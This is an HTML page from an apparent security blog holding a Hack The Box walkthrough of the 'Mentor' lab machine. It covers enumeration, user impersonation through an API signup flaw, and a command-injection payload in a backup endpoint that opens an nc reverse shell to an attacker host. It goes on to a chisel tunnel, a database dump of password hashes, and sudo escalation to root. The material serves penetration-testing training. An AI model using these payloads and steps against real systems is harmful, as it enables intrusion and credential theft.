@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>HTB - Mentor [Medium] // MeowMeowAttack&#39;s security.log</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.08c75f03335e384efd6114f8f43e0cfe7b8782f807f0ffcad6fd48c7431e850e.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Mentor [Medium]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.85.27 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="HTB - Mentor [Medium]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.85.27 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/mentor/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-12-12T15:29:59+13:00" />
+<meta property="article:modified_time" content="2022-12-12T15:29:59+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/contact/">/contact</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">/about</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/support/">/support</a>
+      </nav>
+      <p>MeowMeow is a pentest meow, a full of justice meow, and a nonsense-free meow. b******t, just filling this up for better SEO.</p>
+      <a style="font-size: smaller;" href="/privacy/">Privacy Policy</a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="meowmeowattack" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">HTB - Mentor [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 12, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="tcp-scan">TCP Scan</h2>
+<pre tabindex="0"><code>&gt; TARGET=10.129.85.27 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://mentorquotes.htb/
+</code></pre><ul>
+<li>Found domain: <code>mentorquotes.htb</code></li>
+</ul>
+<h2 id="wen-enum">Wen Enum</h2>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://mentorquotes.htb/&#34; -H &#34;Host: FUZZ.mentorquotes.htb&#34; --hl 9
+
+000000051:   404        0 L      2 W        22 Ch       &#34;api&#34;
+
+&gt; dirsearch -u http://api.mentorquotes.htb/
+[19:48:13] 307 -    0B  - /admin  -&gt;  http://api.mentorquotes.htb/admin/
+[19:48:15] 422 -  186B  - /admin/
+[19:48:15] 422 -  186B  - /admin/?/login
+[19:48:16] 307 -    0B  - /admin/backup/  -&gt;  http://api.mentorquotes.htb/admin/backup
+[19:48:38] 405 -   31B  - /auth/login
+[19:48:56] 200 -  969B  - /docs
+[19:48:56] 307 -    0B  - /docs/  -&gt;  http://api.mentorquotes.htb/docs
+[19:49:46] 403 -  285B  - /server-status/
+[19:49:46] 403 -  285B  - /server-status
+[19:50:03] 307 -    0B  - /users  -&gt;  http://api.mentorquotes.htb/users/
+[19:50:03] 307 -    0B  - /users/admin.php  -&gt;  http://api.mentorquotes.htb/users/admin.php/
+[19:50:03] 422 -  186B  - /users/
+[19:50:03] 307 -    0B  - /users/admin  -&gt;  http://api.mentorquotes.htb/users/admin/
+[19:50:03] 307 -    0B  - /users/login  -&gt;  http://api.mentorquotes.htb/users/login/
+[19:50:03] 307 -    0B  - /users/login.php  -&gt;  http://api.mentorquotes.htb/users/login.php/
+[19:50:03] 307 -    0B  - /users/login.aspx  -&gt;  http://api.mentorquotes.htb/users/login.aspx/
+[19:50:03] 307 -    0B  - /users/login.html  -&gt;  http://api.mentorquotes.htb/users/login.html/
+[19:50:03] 307 -    0B  - /users/login.jsp  -&gt;  http://api.mentorquotes.htb/users/login.jsp/
+[19:50:03] 307 -    0B  - /users/login.js  -&gt;  http://api.mentorquotes.htb/users/login.js/
+</code></pre><ul>
+<li>Browsing to <code>http://api.mentorquotes.htb/docs</code>, found james&rsquo;s email</li>
+</ul>
+<pre tabindex="0"><code>james@mentorquotes.htb
+</code></pre><h2 id="foothold">Foothold</h2>
+<ul>
+<li>Tampering with the method: <code>http://api.mentorquotes.htb/docs#/Auth/create_user_auth_signup_post</code> with the following payload. We can register a user called <code>james</code> and provide our own email.</li>
+</ul>
+<pre tabindex="0"><code>{
+  &#34;email&#34;: &#34;james@meow.com&#34;,
+  &#34;username&#34;: &#34;james&#34;,
+  &#34;password&#34;: &#34;test1234&#34;
+}
+</code></pre><ul>
+<li>Now, we are able to login using <code>http://api.mentorquotes.htb/docs#/Auth/login_auth_login_post</code> with the same payload and receive a token</li>
+</ul>
+<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW93LmNvbSJ9.uUc8K0Weo06PoaonawiZOo_wEcdQE8DWNSRXvrwSaGU
+</code></pre><ul>
+<li>And, we can query the <code>/admin</code> section with the token just created</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/
+{&#34;admin_funcs&#34;:{&#34;check db connection&#34;:&#34;/check&#34;,&#34;backup the application&#34;:&#34;/backup&#34;}}
+</code></pre><ul>
+<li>Checking the two paths under <code>/admin</code> received the following responses:</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/check
+{&#34;details&#34;:&#34;Not implemented yet!&#34;}
+
+&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/backup
+{&#34;detail&#34;:&#34;Method Not Allowed&#34;}
+# for a post request, this is the response
+{&#34;detail&#34;:[{&#34;loc&#34;:[&#34;body&#34;],&#34;msg&#34;:&#34;field required&#34;,&#34;type&#34;:&#34;value_error.missing&#34;}]}
+
+# to make a backup, the expected payload format is
+&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/backup -H &#34;content-type: application/json&#34; -d &#34;{\&#34;body\&#34;:\&#34;test\&#34;,\&#34;path\&#34;:\&#34;test\&#34;}&#34;
+</code></pre><ul>
+<li>Further enum found that the <code>path</code> parameter is vulnerable to cmd injection</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/backup -H &#34;content-type: application/json&#34; -d &#39;{&#34;body&#34;:&#34;test&#34;,&#34;path&#34;:&#34;test `wget http://&lt;ip&gt;`&#34;}&#39;
+</code></pre><ul>
+<li>This can be used to get a reverse shell</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -H &#34;authorization: &lt;token&gt;&#34; http://api.mentorquotes.htb/admin/backup -H &#34;content-type: application/json&#34; -d &#39;{&#34;body&#34;:&#34;test&#34;,&#34;path&#34;:&#34;test `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;attacker-ip&gt; 4444 &gt;/tmp/f`&#34;}&#39;
+</code></pre><ul>
+<li>Fetch the user flag</li>
+</ul>
+<pre tabindex="0"><code>/home/svc # cat user.txt
+</code></pre><h2 id="ssh-access-as-svc">SSH access as svc</h2>
+<ul>
+<li>Locate <code>/app_backkup.tar</code> and examine the script <code>/app/app/db.py</code> found a connection string to db</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>DATABASE_URL <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;DATABASE_URL&#34;</span>, <span style="color:#e6db74">&#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&#34;</span>)
+</span></span></code></pre></div><ul>
+<li>Port forward the target port using chisel</li>
+</ul>
+<pre tabindex="0"><code># on kali
+&gt; chisel server -p 9999 --reverse
+
+# on target
+&gt; chisel client --max-retry-count=1 &lt;attacker-ip&gt;:9999 R:55432:172.22.0.1:5432
+</code></pre><ul>
+<li>Login to the postgres db via the forwarded port and dump all user info</li>
+</ul>
+<pre tabindex="0"><code>&gt; psql -h 127.0.0.1 -p 55432 -Upostgres -W -d mentorquotes_db
+
+mentorquotes_db=# \dt
+          List of relations
+ Schema |   Name   | Type  |  Owner   
+--------+----------+-------+----------
+ public | cmd_exec | table | postgres
+ public | quotes   | table | postgres
+ public | users    | table | postgres
+(3 rows)
+
+mentorquotes_db=# select * from users;
+ id |         email          |  username   |             password             
+----+------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36****
+  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f95****
+  4 | james@meow.com         | james       | 16d7a4fca7442dda3ad93c9a726597e4
+</code></pre><ul>
+<li><code>53f22d0dfa10dce7e29cd31f4f95****</code> can be cracked on <code>https://crackstation.net/</code></li>
+</ul>
+<blockquote>
+<div id="password1"></div>
+<script type="text/javascript">
+    window.onload = showHidden("password1", "U2FsdGVkX1/UtMcZzGItFUUUl0uVmQqtCgCdAwszRtPMz8ZQPv9vwsIvqLhwh9Gb",  2 );
+</script>
+
+</blockquote>
+<ul>
+<li>This can be used to login to the target via <code>ssh</code> as <code>svc</code></li>
+</ul>
+<h2 id="pe">PE</h2>
+<ul>
+<li>Examine <code>/etc/snmp/snmpd.conf</code> for james&rsquo; password</li>
+</ul>
+<pre tabindex="0"><code>createUser bootstrap MD5 ******************* DES
+</code></pre><blockquote>
+<div id="password2"></div>
+<script type="text/javascript">
+    window.onload = showHidden("password2", "U2FsdGVkX1/C525twsHtlLldQgL3nvHKrhVrZ7H5Ci6aLH9xQDiM84vHJgojr8gV",  2 );
+</script>
+
+</blockquote>
+<ul>
+<li>Prompt to root</li>
+</ul>
+<pre tabindex="0"><code>svc@mentor:~$ su - james
+Password: 
+james@mentor:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+james@mentor:~$ sudo /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
